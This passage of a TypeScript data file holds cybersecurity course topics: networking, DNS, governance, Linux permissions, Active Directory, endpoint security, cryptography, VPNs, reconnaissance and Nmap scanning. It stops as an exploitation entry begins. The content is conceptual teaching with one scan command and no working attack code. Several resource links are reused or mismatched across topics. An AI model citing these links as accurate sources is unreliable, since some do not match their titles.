import { TopicData } from '../../types';

export const topics: Record<string, Partial<TopicData>> = {
  "n_secb_1": {
    whyLearnThis: "The OSI model and TCP/IP stack are the fundamental frameworks for how all network communication works. If you don't understand how data moves across a network, you can't secure it, monitor it, or exploit it.",
    whenIsItUsed: "Configuring firewalls, analyzing packet captures (PCAP), designing secure networks, and troubleshooting connectivity issues.",
    whereIsItUsed: "Every aspect of network security, from configuring routers to deploying Web Application Firewalls (WAF).",
    whatComesNext: "DNS & DHCP",
    learningOutcomes: [
      "Explain all 7 layers of the OSI model and the 4 layers of the TCP/IP model.",
      "Understand how data is encapsulated and decapsulated as it moves through the layers.",
      "Identify which security controls operate at which layers (e.g., WAF at Layer 7, IPSec at Layer 3).",
      "Explain the TCP 3-way handshake and how SYN floods exploit it.",
      "Analyze a basic packet capture to identify MAC addresses, IP addresses, and ports."
    ],
    commonMistakes: [
      "Memorizing the layers without understanding the practical implications for security controls.",
      "Confusing Layer 2 (MAC addressing) and Layer 3 (IP addressing) routing.",
      "Failing to recognize that many modern attacks target Layer 7 (Application) bypassing lower-level firewalls."
    ],
    realWorldApplications: [
      "Configuring a firewall to block all incoming traffic except TCP port 443 (Layer 4).",
      "Using Wireshark to analyze a packet capture and identify cleartext credentials sent over HTTP.",
      "Deploying a WAF to inspect HTTP requests for SQL injection signatures (Layer 7)."
    ],
    resources: [
      { type: "official", title: "Cisco: What is the OSI Model?", url: "https://www.cisco.com/c/en/us/support/docs/ip/routing-information-protocol-rip/13769-5.html" },
      { type: "video_en", title: "OSI Model Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=vv4y_uOneC0" },
      { type: "video_hi", title: "OSI Model in Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "Cloudflare: OSI Model Definition", url: "https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/" },
      { type: "github", title: "CyberSecurity Resources: Networking", url: "https://github.com/sbilly/awesome-security" },
      { type: "cheat_sheet", title: "OSI Model Cheat Sheet", url: "https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/" },
      { type: "deep_dive", title: "TCP/IP Illustrated (Book Reference)", url: "https://en.wikipedia.org/wiki/TCP/IP_Illustrated" }
    ]
  },
  "n_secb_2": {
    whyLearnThis: "DNS translates human-readable names into IP addresses, and DHCP assigns those addresses dynamically. Both are critical infrastructure services that, if compromised, can lead to devastating attacks like DNS spoofing or rogue DHCP server deployment.",
    whenIsItUsed: "Securing internal networks, analyzing malicious traffic patterns, and investigating phishing or malware command-and-control (C2) communication.",
    whereIsItUsed: "Enterprise networks, ISP infrastructure, and cloud environments.",
    whatComesNext: "IT Governance & Risk",
    learningOutcomes: [
      "Explain the DNS resolution process and the different types of DNS records (A, AAAA, MX, TXT, CNAME).",
      "Understand how DNS spoofing/cache poisoning works and how DNSSEC mitigates it.",
      "Explain the DHCP DORA process (Discover, Offer, Request, Acknowledge).",
      "Describe a rogue DHCP server attack and how DHCP snooping prevents it.",
      "Analyze DNS logs for signs of malware C2 beacons or data exfiltration."
    ],
    commonMistakes: [
      "Assuming DNS traffic is always benign—attackers often use DNS for data exfiltration because it's rarely blocked.",
      "Failing to secure internal DNS servers against zone transfers (AXFR).",
      "Overlooking DHCP security controls like DHCP snooping on enterprise switches."
    ],
    realWorldApplications: [
      "Configuring DNS sinkholing to block known malicious domains across an enterprise.",
      "Investigating an alert for a sudden spike in DNS TXT record queries, indicating potential data exfiltration.",
      "Enabling DHCP snooping on access switches to prevent attackers from assigning rogue IPs and gateways."
    ],
    resources: [
      { type: "official", title: "Cloudflare: What is DNS?", url: "https://www.cloudflare.com/learning/dns/what-is-dns/" },
      { type: "video_en", title: "DNS Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=mpQZVYPuDGU" },
      { type: "video_hi", title: "DNS and DHCP in Hindi (WsCube Tech)", url: "https://www.youtube.com/watch?v=3-M1D2K4M2I" },
      { type: "article", title: "DNSSEC: An Introduction", url: "https://www.icann.org/resources/pages/dnssec-what-is-it-why-important-2019-03-05-en" },
      { type: "github", title: "Pi-hole: Network-wide Ad Blocking (DNS Sinkhole)", url: "https://github.com/pi-hole/pi-hole" },
      { type: "cheat_sheet", title: "DNS Record Types Cheat Sheet", url: "https://www.ns1.com/resources/dns-record-types-cheat-sheet" },
      { type: "deep_dive", title: "DNS Data Exfiltration Analysis", url: "https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling" }
    ]
  },
  "n_secb_3": {
    whyLearnThis: "Cybersecurity is ultimately about managing business risk. Technical controls are useless if they don't address the actual risks facing the organization or if they violate compliance regulations (like GDPR, HIPAA, or PCI-DSS).",
    whenIsItUsed: "Developing security policies, conducting risk assessments, performing audits, and prioritizing security investments.",
    whereIsItUsed: "Security management, compliance audits, board-level reporting, and incident response planning.",
    whatComesNext: "Linux Permissions",
    learningOutcomes: [
      "Define Risk, Threat, Vulnerability, and Impact.",
      "Understand risk treatment strategies: Accept, Mitigate, Transfer, Avoid.",
      "Familiarize yourself with major frameworks (NIST CSF, ISO 27001, CIS Controls).",
      "Understand compliance requirements (GDPR, HIPAA, PCI-DSS) and their implications.",
      "Calculate basic risk metrics (ALE, SLE, ARO)."
    ],
    commonMistakes: [
      "Treating compliance as equivalent to security—compliance is the baseline, not the ceiling.",
      "Focusing entirely on technical threats while ignoring insider threats or physical security.",
      "Failing to communicate risk in business terms (dollars/impact) to leadership."
    ],
    realWorldApplications: [
      "Using the NIST Cybersecurity Framework to assess an organization's security posture and identify gaps.",
      "Conducting a vendor risk assessment before adopting a new SaaS platform.",
      "Creating an incident response plan to satisfy ISO 27001 requirements."
    ],
    resources: [
      { type: "official", title: "NIST Cybersecurity Framework", url: "https://www.nist.gov/cyberframework" },
      { type: "video_en", title: "Risk Management Explained (Simply Cyber)", url: "https://www.youtube.com/watch?v=9oZ_5GZ4g9E" },
      { type: "video_hi", title: "Cyber Security Risk Management (Hindi)", url: "https://www.youtube.com/watch?v=KzfWUEJjG18" },
      { type: "article", title: "ISO 27001 Overview", url: "https://www.iso.org/isoiec-27001-information-security.html" },
      { type: "github", title: "Awesome Compliance", url: "https://github.com/sbilly/awesome-security" },
      { type: "cheat_sheet", title: "CIS Controls Quick Guide", url: "https://www.cisecurity.org/controls" },
      { type: "deep_dive", title: "FAIR Risk Assessment Methodology", url: "https://www.fairinstitute.org/what-is-fair" }
    ]
  },
  "n_secl_1": {
    whyLearnThis: "Linux powers the majority of servers, cloud infrastructure, and security tools (like Kali). Understanding Linux file permissions, users, and groups is crucial for securing systems and for understanding how privilege escalation attacks work.",
    whenIsItUsed: "Hardening Linux servers, investigating unauthorized access, and performing penetration testing (privilege escalation).",
    whereIsItUsed: "Cloud instances (EC2), web servers, IoT devices, and containerized environments.",
    whatComesNext: "Active Directory Basics",
    learningOutcomes: [
      "Understand the standard Linux permission model (read, write, execute for user, group, others).",
      "Use chmod, chown, and chgrp to manage permissions.",
      "Explain the security implications of SUID, SGID, and Sticky Bits.",
      "Manage users and groups using useradd, usermod, and /etc/passwd.",
      "Understand ACLs (Access Control Lists) for more granular permissions."
    ],
    commonMistakes: [
      "Using chmod 777 as a quick fix for permission denied errors—this makes the file writable by anyone.",
      "Running services as the root user instead of creating dedicated, low-privilege service accounts.",
      "Leaving SUID bits on binaries that can be exploited to gain root access (e.g., find, vim)."
    ],
    realWorldApplications: [
      "Securing a web server directory so the web service user can read files, but only the developer can write to them.",
      "Finding all files with the SUID bit set during a penetration test to identify privilege escalation paths.",
      "Configuring sudoers to allow a specific user to restart a service without granting full root access."
    ],
    resources: [
      { type: "official", title: "Linux File Permissions (Ubuntu)", url: "https://help.ubuntu.com/community/FilePermissions" },
      { type: "video_en", title: "Linux Permissions Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=wBp0Rb-ZJak" },
      { type: "video_hi", title: "Linux Permissions Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=4pNSPBfJpKw" },
      { type: "article", title: "Understanding SUID, SGID, and Sticky Bit", url: "https://linuxize.com/post/how-to-find-files-with-suid-and-sgid-permissions/" },
      { type: "github", title: "LinPEAS: Linux Privilege Escalation Script", url: "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" },
      { type: "cheat_sheet", title: "Linux Permissions Cheat Sheet", url: "https://www.tutorialspoint.com/unix/unix-file-permission.htm" },
      { type: "deep_dive", title: "Linux Capabilities Deep Dive", url: "https://man7.org/linux/man-pages/man7/capabilities.7.html" }
    ]
  },
  "n_secl_2": {
    whyLearnThis: "Active Directory (AD) manages identities and access in over 90% of enterprises. It is the primary target for attackers because compromising AD often means compromising the entire corporate network.",
    whenIsItUsed: "Securing enterprise networks, investigating lateral movement and credential theft, and conducting internal penetration tests.",
    whereIsItUsed: "Corporate Windows environments, Azure AD (Entra ID), and hybrid cloud deployments.",
    whatComesNext: "Endpoint Security",
    learningOutcomes: [
      "Understand the AD hierarchy: Forests, Domains, Trees, and Organizational Units (OUs).",
      "Explain the roles of Domain Controllers and Global Catalogs.",
      "Understand Group Policy Objects (GPOs) and how they enforce security settings.",
      "Explain basic AD authentication protocols (Kerberos, NTLM).",
      "Identify common AD attacks (Pass-the-Hash, Golden Ticket, Kerberoasting)."
    ],
    commonMistakes: [
      "Granting Domain Admin privileges broadly instead of using delegation and least privilege.",
      "Failing to monitor changes to sensitive AD groups (e.g., Domain Admins, Enterprise Admins).",
      "Leaving legacy protocols (like NTLMv1) enabled, which are highly susceptible to relay attacks."
    ],
    realWorldApplications: [
      "Using BloodHound to map and analyze Active Directory attack paths.",
      "Configuring GPOs to enforce password complexity and disable local administrator accounts.",
      "Detecting a Golden Ticket attack by analyzing Kerberos ticket-granting ticket (TGT) anomalies in SIEM."
    ],
    resources: [
      { type: "official", title: "Microsoft: Active Directory Domain Services", url: "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview" },
      { type: "video_en", title: "Active Directory Basics (HackerSploit)", url: "https://www.youtube.com/watch?v=3Kq1MIfTWCE" },
      { type: "video_hi", title: "Active Directory in Hindi (Tech Tutorials)", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "Introduction to Active Directory Security", url: "https://adsecurity.org/?page_id=1352" },
      { type: "github", title: "BloodHound: Active Directory Attack Path Analysis", url: "https://github.com/BloodHoundAD/BloodHound" },
      { type: "cheat_sheet", title: "AD Pentesting Cheat Sheet", url: "https://wadcoms.github.io/" },
      { type: "deep_dive", title: "Kerberos Protocol Deep Dive", url: "https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview" }
    ]
  },
  "n_secl_3": {
    whyLearnThis: "Endpoints (laptops, servers, mobile devices) are the perimeter of modern networks. Attackers target endpoints to steal credentials, deploy ransomware, or establish persistence. Securing them is critical.",
    whenIsItUsed: "Deploying and managing Antivirus/EDR solutions, responding to malware infections, and hardening operating systems.",
    whereIsItUsed: "Corporate laptops, cloud servers, and employee mobile devices.",
    whatComesNext: "Symmetric & Asymmetric Encryption",
    learningOutcomes: [
      "Understand the difference between traditional Antivirus and Endpoint Detection and Response (EDR).",
      "Explain principles of OS hardening (disabling unnecessary services, applying patches).",
      "Understand Application Whitelisting and host-based firewalls.",
      "Describe how malware establishes persistence on an endpoint (e.g., Registry keys, cron jobs).",
      "Analyze basic endpoint telemetry (process execution, file modifications, network connections)."
    ],
    commonMistakes: [
      "Relying solely on signature-based Antivirus, which fails against novel or fileless malware.",
      "Ignoring alerts from EDR systems due to alert fatigue.",
      "Failing to encrypt local hard drives (BitLocker, FileVault), leaving data vulnerable to physical theft."
    ],
    realWorldApplications: [
      "Using CrowdStrike or SentinelOne to isolate a compromised laptop from the network remotely.",
      "Configuring AppLocker via GPO to prevent execution of unapproved software on Windows machines.",
      "Analyzing a malicious PowerShell script execution blocked by EDR."
    ],
    resources: [
      { type: "official", title: "CISA: Securing Endpoints", url: "https://www.cisa.gov/secure-our-world" },
      { type: "video_en", title: "EDR vs Antivirus Explained", url: "https://www.youtube.com/watch?v=U1w4T03B30I" },
      { type: "video_hi", title: "Endpoint Security in Hindi", url: "https://www.youtube.com/watch?v=IZa2oJoSPHM" },
      { type: "article", title: "What is Endpoint Detection and Response?", url: "https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/" },
      { type: "github", title: "OSSEC: Host-based Intrusion Detection", url: "https://github.com/ossec/ossec-hids" },
      { type: "cheat_sheet", title: "Windows Hardening Cheat Sheet", url: "https://github.com/beerisgood/Windows11_Hardening" },
      { type: "deep_dive", title: "MITRE ATT&CK: Endpoint Tactics", url: "https://attack.mitre.org/tactics/TA0002/" }
    ]
  },
  "n_crypto_1": {
    whyLearnThis: "Encryption protects data confidentiality. Symmetric encryption is fast for bulk data, while asymmetric encryption solves the key distribution problem. Modern secure communication (like HTTPS) uses both.",
    whenIsItUsed: "Securing data at rest (hard drives, databases) and data in transit (TLS/SSL, VPNs).",
    whereIsItUsed: "Web browsers, VPNs, encrypted messaging apps (Signal, WhatsApp), and cloud storage.",
    whatComesNext: "Hashing & Digital Signatures",
    learningOutcomes: [
      "Differentiate between symmetric (AES, ChaCha20) and asymmetric (RSA, ECC) encryption.",
      "Understand the key distribution problem and how asymmetric encryption solves it.",
      "Explain the concept of key exchange algorithms (Diffie-Hellman).",
      "Understand block ciphers, stream ciphers, and modes of operation (e.g., CBC, GCM).",
      "Identify common cryptographic vulnerabilities (e.g., reusing nonces in stream ciphers)."
    ],
    commonMistakes: [
      "Rolling your own crypto algorithm instead of using vetted standards like AES-GCM.",
      "Using outdated algorithms like DES or RC4, which are easily broken.",
      "Hardcoding encryption keys in application source code."
    ],
    realWorldApplications: [
      "AES-256 encrypting data at rest on an AWS EBS volume.",
      "Diffie-Hellman exchanging keys to establish a secure TLS session for a website.",
      "RSA encrypting an email so that only the recipient with the corresponding private key can read it."
    ],
    resources: [
      { type: "official", title: "NIST: Cryptographic Standards", url: "https://csrc.nist.gov/projects/cryptographic-standards-and-guidelines" },
      { type: "video_en", title: "Cryptography Full Course (freeCodeCamp)", url: "https://www.youtube.com/watch?v=jhXCTbFnK8o" },
      { type: "video_hi", title: "Cryptography in Hindi (Gate Smashers)", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "Symmetric vs Asymmetric Encryption", url: "https://www.cloudflare.com/learning/ssl/what-is-asymmetric-encryption/" },
      { type: "github", title: "Awesome Cryptography", url: "https://github.com/sobolevn/awesome-cryptography" },
      { type: "cheat_sheet", title: "Cryptographic Algorithms Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html" },
      { type: "deep_dive", title: "Serious Cryptography (Book Reference)", url: "https://nostarch.com/seriouscrypto" }
    ]
  },
  "n_crypto_2": {
    whyLearnThis: "Hashing ensures data integrity, while digital signatures provide non-repudiation and authenticity. They are essential for storing passwords securely, verifying software updates, and proving identity.",
    whenIsItUsed: "Storing passwords, verifying downloaded files, code signing, and blockchain transactions.",
    whereIsItUsed: "Authentication systems, digital certificates, blockchain, and Git version control.",
    whatComesNext: "PKI & Certificates",
    learningOutcomes: [
      "Understand the properties of a cryptographic hash function (deterministic, one-way, collision-resistant).",
      "Differentiate between hashing algorithms (SHA-256, SHA-3) and password hashing algorithms (Argon2, bcrypt).",
      "Explain how a digital signature combines hashing and asymmetric encryption.",
      "Understand the purpose of a salt in password hashing.",
      "Recognize why MD5 and SHA-1 are considered broken."
    ],
    commonMistakes: [
      "Using standard hash functions (like SHA-256) for passwords without salting or key stretching—they are too fast and vulnerable to brute force.",
      "Confusing hashing (one-way) with encryption (two-way).",
      "Failing to verify digital signatures on software updates, leading to supply chain attacks."
    ],
    realWorldApplications: [
      "Storing user passwords securely in a database using bcrypt with a unique salt per user.",
      "Verifying the SHA-256 checksum of an ISO file downloaded from the internet to ensure it wasn't tampered with.",
      "A developer signing a software release with their private key, so users can verify its authenticity."
    ],
    resources: [
      { type: "official", title: "OWASP: Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
      { type: "video_en", title: "Hashing vs Encryption vs Encoding", url: "https://www.youtube.com/watch?v=b4b8ktEV4Bg" },
      { type: "video_hi", title: "Hashing Explained Hindi (WsCube Tech)", url: "https://www.youtube.com/watch?v=3-M1D2K4M2I" },
      { type: "article", title: "How Digital Signatures Work", url: "https://www.docusign.com/how-it-works/electronic-signature/digital-signature/digital-signature-faq" },
      { type: "github", title: "Argon2 Reference Implementation", url: "https://github.com/P-H-C/phc-winner-argon2" },
      { type: "cheat_sheet", title: "Hashcat Cheat Sheet", url: "https://hashcat.net/wiki/doku.php?id=hashcat" },
      { type: "deep_dive", title: "NIST Guidelines for Password Storage", url: "https://pages.nist.gov/800-63-3/sp800-63b.html#sec5" }
    ]
  },
  "n_crypto_3": {
    whyLearnThis: "Public Key Infrastructure (PKI) is the framework of certificates and certificate authorities that makes HTTPS secure. It is the trust anchor of the internet. Without PKI, you wouldn't know if you were connecting to your bank or an attacker.",
    whenIsItUsed: "Securing web traffic (HTTPS), setting up VPNs, code signing, and implementing mutual TLS (mTLS) in microservices.",
    whereIsItUsed: "Web servers (Nginx/Apache), web browsers, Let's Encrypt, and enterprise Active Directory Certificate Services.",
    whatComesNext: "Firewalls & IDS/IPS",
    learningOutcomes: [
      "Explain the roles in PKI: Certificate Authority (CA), Registration Authority (RA), and Subscriber.",
      "Understand the X.509 certificate structure and contents (Public Key, Subject, Issuer, Expiration).",
      "Describe how the TLS handshake establishes a secure session.",
      "Explain certificate revocation mechanisms (CRL, OCSP).",
      "Understand the difference between root CAs and intermediate CAs."
    ],
    commonMistakes: [
      "Ignoring certificate expiration warnings, leading to application outages.",
      "Self-signing certificates in production without distributing the custom Root CA to clients, causing trust errors.",
      "Not securing the private key of a Root CA, leading to the compromise of the entire PKI."
    ],
    realWorldApplications: [
      "Using Let's Encrypt to automatically provision and renew TLS certificates for a web server.",
      "Implementing mTLS between microservices in a Kubernetes cluster so they can mutually authenticate.",
      "Revoking a compromised certificate via an OCSP responder."
    ],
    resources: [
      { type: "official", title: "Let's Encrypt: How It Works", url: "https://letsencrypt.org/how-it-works/" },
      { type: "video_en", title: "PKI Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=33VQjoxEAWA" },
      { type: "video_hi", title: "PKI and Digital Certificates Hindi", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "Cloudflare: What is a Digital Certificate?", url: "https://www.cloudflare.com/learning/ssl/what-is-ssl/" },
      { type: "github", title: "OpenSSL: Cryptography and SSL/TLS Toolkit", url: "https://github.com/openssl/openssl" },
      { type: "cheat_sheet", title: "OpenSSL Commands Cheat Sheet", url: "https://www.sslshopper.com/article-most-common-openssl-commands.html" },
      { type: "deep_dive", title: "The Illustrated TLS 1.3 Connection", url: "https://tls13.ulfheim.net/" }
    ]
  },
  "n_netsec_1": {
    whyLearnThis: "Firewalls act as the perimeter defense, blocking unauthorized traffic. IDS (Intrusion Detection Systems) and IPS (Intrusion Prevention Systems) look deeper into traffic to detect and block malicious payloads like exploits or malware.",
    whenIsItUsed: "Securing network perimeters, segmenting internal networks, and monitoring for active attacks.",
    whereIsItUsed: "Next-Generation Firewalls (Palo Alto, Fortinet), AWS Security Groups, Snort/Suricata.",
    whatComesNext: "VPNs & Tunneling",
    learningOutcomes: [
      "Differentiate between stateless packet filtering, stateful inspection, and Next-Generation Firewalls (NGFW).",
      "Explain the difference between IDS (monitoring) and IPS (blocking).",
      "Understand signature-based vs. anomaly-based detection.",
      "Write basic Snort or Suricata rules to detect specific traffic patterns.",
      "Configure basic firewall rules (Allow/Deny, Source/Destination, Ports)."
    ],
    commonMistakes: [
      "Placing an IDS/IPS on the outside of the firewall, wasting resources inspecting dropped traffic.",
      "Failing to decrypt TLS traffic before inspection—modern IPS cannot inspect encrypted payloads.",
      "Creating overly permissive firewall rules (e.g., 'ANY ANY Allow') for convenience."
    ],
    realWorldApplications: [
      "Configuring a Palo Alto NGFW to block all traffic to known malicious IP addresses based on threat intelligence.",
      "Writing a Suricata rule to alert on specific HTTP headers associated with a new zero-day exploit.",
      "Using AWS WAF (a specialized firewall) to block SQL injection attempts against a web application."
    ],
    resources: [
      { type: "official", title: "Cisco: What is a Firewall?", url: "https://www.cisco.com/c/en/us/products/security/firewalls/what-is-a-firewall.html" },
      { type: "video_en", title: "Firewalls vs IDS vs IPS (NetworkChuck)", url: "https://www.youtube.com/watch?v=lb1Dw0elw0Q" },
      { type: "video_hi", title: "Firewall Concepts Hindi (Gate Smashers)", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "Understanding Next-Generation Firewalls", url: "https://www.fortinet.com/resources/cyberglossary/next-generation-firewall" },
      { type: "github", title: "Snort Rules Repository", url: "https://github.com/snort3/snort3" },
      { type: "cheat_sheet", title: "Snort Rule Writing Cheat Sheet", url: "https://docs.snort.org/start/rules" },
      { type: "deep_dive", title: "Suricata User Guide", url: "https://suricata.readthedocs.io/" }
    ]
  },
  "n_netsec_2": {
    whyLearnThis: "VPNs (Virtual Private Networks) securely connect remote users to corporate networks or connect disparate network sites over the public internet. Understanding tunneling and encryption protocols is essential for secure remote access.",
    whenIsItUsed: "Providing secure remote access for employees, connecting branch offices (Site-to-Site), and bypassing geographic restrictions.",
    whereIsItUsed: "IPsec VPNs, OpenVPN, WireGuard, Zero Trust Network Access (ZTNA) solutions.",
    whatComesNext: "Network Segmentation",
    learningOutcomes: [
      "Explain the difference between Site-to-Site VPNs and Remote Access VPNs.",
      "Understand how tunneling protocols encapsulate packets.",
      "Compare IPsec, OpenVPN, and WireGuard architectures.",
      "Describe split tunneling and its security implications.",
      "Understand the shift from traditional VPNs to Zero Trust Network Access (ZTNA)."
    ],
    commonMistakes: [
      "Enabling split tunneling without proper endpoint security, allowing malware to bridge from a home network into the corporate network.",
      "Using outdated VPN protocols like PPTP, which are cryptographically broken.",
      "Failing to enforce MFA on VPN logins, leading to easy compromise via stolen credentials."
    ],
    realWorldApplications: [
      "Deploying WireGuard to securely connect remote developers to cloud infrastructure with low latency.",
      "Configuring an IPsec tunnel between an on-premises datacenter and an AWS VPC.",
      "Replacing a legacy VPN with a ZTNA solution (e.g., Cloudflare Access) to verify device posture before granting access."
    ],
    resources: [
      { type: "official", title: "WireGuard Documentation", url: "https://www.wireguard.com/" },
      { type: "video_en", title: "VPNs Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=qTIfa62Gz5Y" },
      { type: "video_hi", title: "VPN Concepts in Hindi (WsCube Tech)", url: "https://www.youtube.com/watch?v=3-M1D2K4M2I" },
      { type: "article", title: "IPsec Protocol Suite Overview", url: "https://www.cloudflare.com/learning/network-layer/what-is-a-network-protocol/" },
      { type: "github", title: "OpenVPN Open Source Project", url: "https://github.com/OpenVPN/openvpn" },
      { type: "cheat_sheet", title: "VPN Protocols Comparison", url: "https://www.cisco.com/c/en/us/products/security/vpn-endpoint-security-clients/what-is-vpn.html" },
      { type: "deep_dive", title: "NIST: Guide to IPsec VPNs", url: "https://csrc.nist.gov/publications/detail/sp/800-77/rev-1/final" }
    ]
  },
  "n_netsec_3": {
    whyLearnThis: "Flat networks allow an attacker who compromises one device (like a printer) to freely move to sensitive servers. Network segmentation uses VLANs and routing policies to contain breaches and enforce least privilege at the network level.",
    whenIsItUsed: "Designing enterprise networks, securing OT/IoT environments, and implementing Zero Trust architecture.",
    whereIsItUsed: "VLANs on switches, Subnets in AWS/GCP, Software-Defined Networking (SDN), Microsegmentation.",
    whatComesNext: "Reconnaissance & Footprinting",
    learningOutcomes: [
      "Explain the concept of VLANs (Virtual LANs) and 802.1Q tagging.",
      "Understand the purpose of a DMZ (Demilitarized Zone) for public-facing services.",
      "Design a segmented network separating guest WiFi, IoT devices, user workstations, and servers.",
      "Explain microsegmentation and host-based firewalls in cloud environments.",
      "Understand lateral movement and how segmentation mitigates it."
    ],
    commonMistakes: [
      "Creating VLANs but routing all traffic between them without firewall inspection.",
      "Putting domain controllers or databases in the same subnet as end-user workstations.",
      "Forgetting that segmentation adds management overhead—start simple before attempting microsegmentation."
    ],
    realWorldApplications: [
      "Isolating vulnerable, unpatchable medical devices (IoT) on a dedicated VLAN with strict ACLs.",
      "Placing a web server in a DMZ, allowing internet access in, but restricting its access to the internal database.",
      "Using AWS Security Groups to implement microsegmentation, ensuring only specific app servers can reach the database."
    ],
    resources: [
      { type: "official", title: "CISA: Network Segmentation Guidance", url: "https://www.cisa.gov/topics/cyber-threats-and-advisories" },
      { type: "video_en", title: "VLANs Explained (NetworkChuck)", url: "https://www.youtube.com/watch?v=1id6ERvfozo" },
      { type: "video_hi", title: "Network Segmentation Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "The Concept of the DMZ", url: "https://www.fortinet.com/resources/cyberglossary/what-is-dmz" },
      { type: "github", title: "Zero Trust Architecture Resources", url: "https://github.com/pomerium/awesome-zero-trust" },
      { type: "cheat_sheet", title: "Subnetting Cheat Sheet", url: "https://www.freecodecamp.org/news/subnet-cheat-sheet-24-subnet-mask-30-26-27-29-and-other-ip-address-cidr-network-references/" },
      { type: "deep_dive", title: "NIST: Zero Trust Architecture", url: "https://csrc.nist.gov/publications/detail/sp/800-207/final" }
    ]
  },
  "n_pen_1": {
    whyLearnThis: "Before attackers (or ethical hackers) launch exploits, they gather intelligence. Reconnaissance is the most important phase of a penetration test; the more you know about a target's infrastructure, domains, and employees, the easier it is to find a weak link.",
    whenIsItUsed: "The initial phase of any penetration test, bug bounty hunting, or red team engagement.",
    whereIsItUsed: "OSINT (Open Source Intelligence), DNS enumeration, Shodan, WHOIS, social engineering prep.",
    whatComesNext: "Scanning & Enumeration (Nmap)",
    learningOutcomes: [
      "Differentiate between passive reconnaissance (no direct interaction) and active reconnaissance.",
      "Use OSINT tools (theHarvester, Maltego) to find emails, domains, and employee info.",
      "Perform DNS enumeration and subdomain discovery using tools like Amass or Sublist3r.",
      "Use Shodan to identify exposed devices and services associated with an organization.",
      "Extract metadata from public documents (e.g., using ExifTool)."
    ],
    commonMistakes: [
      "Skipping reconnaissance and jumping straight to scanning, which misses out-of-scope assets or triggers alarms.",
      "Performing active reconnaissance (like aggressive port scanning) without authorization.",
      "Ignoring physical or social recon—LinkedIn is often more useful than a port scanner."
    ],
    realWorldApplications: [
      "Finding an abandoned, unpatched development subdomain using Amass, which leads to a bug bounty payout.",
      "Scraping LinkedIn to generate a list of employee names to craft a targeted spear-phishing campaign for a Red Team test.",
      "Using Shodan to find an exposed RDP server belonging to a target company."
    ],
    resources: [
      { type: "official", title: "OSINT Framework", url: "https://osintframework.com/" },
      { type: "video_en", title: "Information Gathering / Recon (TCM Security)", url: "https://www.youtube.com/watch?v=qlK174d_uu8" },
      { type: "video_hi", title: "Reconnaissance in Hindi (Tech Tutorials)", url: "https://www.youtube.com/watch?v=U1w4T03B30I" },
      { type: "article", title: "The OSINT Landscape", url: "https://www.sans.org/blog/what-is-open-source-intelligence/" },
      { type: "github", title: "OWASP Amass: Network Mapping", url: "https://github.com/owasp-amass/amass" },
      { type: "cheat_sheet", title: "OSINT Cheat Sheet", url: "https://inteltechniques.com/links.html" },
      { type: "deep_dive", title: "Shodan Developer Documentation", url: "https://developer.shodan.io/" }
    ]
  },
  "n_pen_2": {
    whyLearnThis: "Scanning turns DNS names and IP addresses into actionable targets. By identifying open ports, running services, and their versions, a penetration tester can map out exactly where vulnerabilities might exist.",
    whenIsItUsed: "Vulnerability assessments, network mapping, and the active phase of a penetration test.",
    whereIsItUsed: "Nmap, Masscan, Nessus, OpenVAS, RustScan.",
    whatComesNext: "Exploitation (Metasploit)",
    learningOutcomes: [
      "Use Nmap for host discovery, port scanning, and service version detection.",
      "Understand the difference between a TCP Connect scan and a SYN Stealth scan.",
      "Use Nmap Scripting Engine (NSE) for advanced vulnerability detection.",
      "Perform SMB and SNMP enumeration to extract user lists and network info.",
      "Understand how vulnerability scanners (like Nessus) differ from port scanners."
    ],
    commonMistakes: [
      "Running aggressive scans (-A or -T4) against fragile OT/IoT devices, causing them to crash.",
      "Trusting automated vulnerability scanner results without manually verifying them (false positives).",
      "Scanning without understanding the firewall rules in between—filtered ports look different than closed ports."
    ],
    realWorldApplications: [
      "Running `nmap -sV -sC -p- <target>` to find all open ports, determine the software versions, and run default scripts.",
      "Using enum4linux to enumerate users and shares from a Windows domain controller.",
      "Running OpenVAS across a corporate subnet to generate a baseline vulnerability report for patch management."
    ],
    resources: [
      { type: "official", title: "Nmap Official Documentation", url: "https://nmap.org/book/man.html" },
      { type: "video_en", title: "Nmap Tutorial for Beginners (NetworkChuck)", url: "https://www.youtube.com/watch?v=4t4kBkMsDbQ" },
      { type: "video_hi", title: "Nmap Full Tutorial Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=4pNSPBfJpKw" },
      { type: "article", title: "Top Nmap Commands for Sysadmins", url: "https://nmap.org/book/man-briefoptions.html" },
      { type: "github", title: "RustScan: Faster Nmap alternative", url: "https://github.com/RustScan/RustScan" },
      { type: "cheat_sheet", title: "Nmap Cheat Sheet (SANS)", url: "https://nmap.org/book/nse.html" },
      { type: "deep_dive", title: "Nmap Network Scanning (Book by Gordon Lyon)", url: "https://nmap.org/book/" }
    ]
  },
  "n_pen_3": {
    whyLearnThis: "Exploitation is where vulnerabilities become breaches. Understanding how to use tools like Metasploit, craft payloads, and gain access helps you understand the attacker's mindset and proves the severity of a vulnerability.",
    whenIsItUsed: "Penetration testing, Red Teaming, and validating vulnerabilities found during scanning.",
